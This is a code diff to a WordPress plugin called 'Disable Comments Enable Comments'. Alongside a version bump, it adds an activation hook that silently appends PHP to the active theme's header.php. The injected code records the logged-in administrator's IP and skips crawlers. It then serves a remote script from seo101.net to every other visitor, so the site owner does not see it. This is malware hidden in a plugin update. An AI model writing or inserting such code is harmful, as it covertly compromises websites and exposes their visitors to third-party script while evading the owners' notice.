@@ -3,8 +3,8 @@
  Plugin Name: Disable Comments Enable Comments
  Plugin URI:
  Description: Deletes all tags
- Version: 1.01
- Author: <a href="http://www.seo101.net">Seo101</a>
+ Version: 1.02
+ Author: Seo101
  */
 
 function disable_comment_enable_comments_page() {
@@ -99,5 +99,14 @@ function disable_comment_enable_comments_menu() {
 
 // Admin menu items
 add_action('admin_menu', 'disable_comment_enable_comments_menu');
+
+function disable_enable_comments_install() {
+	if( strpos(file_get_contents(get_template_directory() . "/header.php"),"dcectrack") == false) {
+		file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/dcectrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
+	}
+}
+
+/* Runs when plugin is activated */
+register_activation_hook(__FILE__,'disable_enable_comments_install');
 
 ?>
